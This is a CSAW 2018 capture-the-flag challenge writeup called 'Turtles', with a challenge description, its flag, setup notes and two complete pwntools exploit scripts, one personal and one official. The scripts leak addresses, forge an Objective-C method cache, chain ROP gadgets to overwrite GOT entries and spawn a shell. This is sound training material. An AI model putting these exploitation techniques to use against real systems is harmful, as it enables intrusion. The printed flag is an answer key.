# Turtles

## Description

Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them?

## Points

200

## Flag

`flag{i_like_turtl3$_do_u?}`

## Setup

Install docker and make sure port 8024 is open

```
./setup.sh
./run.sh
```

## Notes

Provide them with libs folder and turtles binary

## Solution

个人题解：

```py
#!/usr/bin/env python2
# coding: utf-8

from pwn import *
import itertools

IP = "pwn.chal.csaw.io"
PORT = 9003

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
mode = args['MODE'].lower()
binary = "./turtles"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    libc = ELF("./libs/libc.so.6")
    binary = ELF("./turtles")
    one_gg = 0x4f322
    padding = 0
else:
    io = process(binary)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/CSAW18/pwn/turtles/turtles"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    binary = ELF("./turtles")
    one_gg = 0xf02a4
    padding = 0x10

# io.recvline()
rud("Here is a Turtle: ")
data = io.readline().strip()
leaked = int(data, base=16)
print "leaked address: ", hex(leaked)


gdb.attach(io, '''
b *0x{:x}
c
'''.format(
    # 0x0000000000400C57,  # read
    # 0x0000000000400C72, # memcpy
    # 0x0000000000400C85, # _objc_msg_lookup
    0x0000000000400C9B, # call rax
    )
)

def calc(target):
    pass

# gadget: 0x0000000000400d36 
"""
.text:0000000000400D36 48 83 C4 08                             add     rsp, 8
.text:0000000000400D3A 5B                                      pop     rbx
.text:0000000000400D3B 5D                                      pop     rbp
.text:0000000000400D3C 41 5C                                   pop     r12
.text:0000000000400D3E 41 5D                                   pop     r13
.text:0000000000400D40 41 5E                                   pop     r14
.text:0000000000400D42 41 5F                                   pop     r15
"""
rdx_ = p64(0) + p64(leaked + 0x10 + 0x48) + p64(0x0000000000400d36) + "B"*0x10 + \
    p64(0xaa) + p64(0)*2 + p64(leaked + 0x10)
address_of_target_2 = p64(0x0000000000400d36)

payload = p64(leaked+0x10) + p64(0) + rdx_ + address_of_target_2 #+ address3


#x86_64 particular gadget, may be can be finded on any ELF64 binary
general_gg1 = 0x0000000000400D36
general_gg2 = 0x0000000000400D20


def ropfunc(function, arg1=0, arg2=0, arg3=0):
    padding = ""
    padding += p64(general_gg1)
    padding += "P" * 8
    padding += p64(0)
    padding += p64(1)
    padding += p64(binary.got[function])
    padding += p64(arg1)
    padding += p64(arg2)
    padding += p64(arg3)
    padding += p64(general_gg2)
    padding += "P" * 0x38
    return padding


rop = ROP("./turtles")
rop.printf(binary.got["setvbuf"])
shellcode = rop.chain()
shellcode += ropfunc("read", 16, binary.got["setvbuf"], 0)
shellcode += ropfunc("setvbuf", 0,0, binary.got["setvbuf"] + 8)  
# as system("sh")

payload += shellcode

sel(payload)

pause()
leaked2 = io.recvrepeat(timeout=2)
leaked2 = u64(leaked2.ljust(8, "\x00"))
libc.address = leaked2 - libc.symbols["setvbuf"]
print "[+] leaklib: ", hex(libc.address)

sel(p64(libc.symbols["system"]) + "/bin/sh\x00")

io.interactive()
```

官方题解：

```py
# 
# Turtles CSAW 2018 Solution
#      _____     ____
#     /      \  |  o | 
#    |        |/ ___\| 
#    |_________/     
#    |_|_| |_|_|
#

from pwn import *

context.log_level = "DEBUG"

p = remote("pwn.chal.csaw.io", 9003)
pause()

elf = ELF("turtles")

heap_leak = int(p.recv().split("\n")[0].split(": ")[-1].strip(), 16)
print "[+] Heap Leak: ", hex(heap_leak)

# libc offsets
# magic_libc_offset: found with one_gadget (https://github.com/david942j/one_gadget)
# this magic gadget is equivalent to execve("/bin/sh", 0, envp) which saves us the
# step of having to find/write "/bin/sh" into the progrma
magic_libc_offset = 0x41320 
printf_libc_offset = 0x50cf0

# various rop gadgets found with rp++ (https://github.com/0vercl0k/rp)

# 0x00400ec3: fsave  [rbp-0x16] ; add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;
addespppppppr = 0x00400ec6

# 0x00400d5f: pop rax ; ret  ;
prax_r = 0x00400e5f

# 0x00400d43: pop rdi ; ret  ;
prdi_r = 0x00400d43

# 0x00400d41: pop rsi ; pop r15 ; ret  ;
prsi_pr = 0x00400d41

# 0x00400cdb: pop rbp ; ret  ;  (1 found)
prbp_r = 0x00400cdb

# format string for leaking out bytes from program
print_llu = " %500s"
print_llu_int = int("000a" + "".join([hex(ord(c))[2:] for c in print_llu][::-1]), 16)

# payload to be sent to program
# we use our heap leak to setup a fake objc method cache
# an attack which is described here (http://phrack.org/issues/66/4.html)
# but adapted to the cache that gnustep objc dictates. objc_msg_lookup for
# gnustep can be found here:
# (https://github.com/gnustep/libobjc/blob/master/sendmsg.c#L275)
# this does the cache lookup and is ultimately the thing being exploited

# *rdi
payload = p64(heap_leak - 0x40 + 0x8)

# *(*rdi + 0x40)
payload += p64(heap_leak + 0x10)

# *(*(*rdi + 0x40))
payload += p64(heap_leak - 0x320 + 0x40)

payload += p64(print_llu_int)

# 0x00400d3d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;
payload += p64(0x00400d3d)

payload += p64(heap_leak + 0x50 - (1 * 0x8))

# Null for printf to return 0 bytes written
payload += p64(0)

# *(*(*rdi + 0x40) + 0x28)
payload += p64(0xca0)

payload += p64(heap_leak - 0xa8 + 0x48)

# 0x00400d36: add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14
# ; pop r15 ; ret  ;
payload += p64(0x00400d36)

# we construct our rop chain to:
# 1) Call printf with an empty string to get rax to be 0
# 2) leak out the got address of printf using the format string " %500s"
# 3) read our calculated libc magic address back into the printf got
# 4) call the "printf" function, which is now pointing to code in libc
#    that will spawn a shell for us
memcpy_ow_addr = elf.got['memcpy'] + 0x830
print_llu_addr = heap_leak + (24 * 0x8)
print_null_addr = heap_leak + 0x30
rop_chain = "".join(map(p64, [
        0xdeadbeefcafebabe,
        0x1337133713371337,
	prdi_r,
	print_null_addr,
	elf.plt['printf'], # put 0 in rax
	prdi_r,
	print_llu_addr,
	prsi_pr,
	elf.got['printf'],
	0,
	elf.plt['printf'], # leak bytes
        prbp_r,
        memcpy_ow_addr,
        0x400c43, # 00400c43  lea     rax, [rbp-0x830 {var_838}]
        print_llu_int,
]))

payload += rop_chain

p.send(payload)

# using the leaked got address, calculate the actual address
# of the magic jump
printf_got_leak = u64(p.recv().strip() + "\x00\x00")
libc_base = printf_got_leak - printf_libc_offset
magic_addr = libc_base + magic_libc_offset

p.send(p64(magic_addr))

# wait for our shell
p.interactive()

```